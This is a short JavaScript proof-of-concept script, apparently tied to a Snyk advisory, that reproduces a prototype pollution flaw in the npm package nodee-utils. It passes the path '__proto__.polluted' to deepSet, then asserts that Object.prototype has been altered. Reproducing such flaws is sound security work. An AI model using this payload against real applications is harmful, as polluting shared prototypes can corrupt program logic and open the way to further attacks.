//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679

const { object } = require('nodee-utils');
const { assert } = require("@firebase/util");

var obj = {}
console.log("Before : " + obj.polluted);
object.deepSet({}, '__proto__.polluted', "yes");

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");